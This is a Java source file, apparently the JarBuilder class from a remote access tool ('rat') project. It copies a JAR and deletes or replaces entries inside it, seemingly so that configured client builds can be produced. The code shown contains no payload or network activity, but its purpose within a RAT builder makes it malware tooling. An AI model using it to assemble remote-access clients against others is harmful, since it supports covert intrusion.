package de.sogomn.rat.builder;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.IOException;
import java.nio.file.FileSystem;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;

import de.sogomn.rat.util.Constants;

public final class JarBuilder {
	
	private JarBuilder() {
		//...
	}
	
	public static void copy(final File destination) throws IOException {
		final Path sourcePath = Constants.JAR_FILE.toPath();
		final Path destinationPath = destination.toPath();
		
		Files.copy(sourcePath, destinationPath, StandardCopyOption.REPLACE_EXISTING);
	}
	
	public static void removeFile(final File jar, final String file) throws IOException {
		final Path jarPath = jar.toPath();
		final FileSystem fileSystem = FileSystems.newFileSystem(jarPath, null);
		final Path path = fileSystem.getPath(file);
		
		Files.delete(path);
		
		fileSystem.close();
	}
	
	public static void replaceFile(final File jar, final String replacementName, final byte[] replacementData) throws IOException {
		final Path jarPath = jar.toPath();
		final FileSystem fileSystem = FileSystems.newFileSystem(jarPath, null);
		final ByteArrayInputStream in = new ByteArrayInputStream(replacementData);
		final Path replacementPath = fileSystem.getPath(replacementName);
		
		Files.copy(in, replacementPath, StandardCopyOption.REPLACE_EXISTING);
		
		in.close();
		fileSystem.close();
	}
	
}
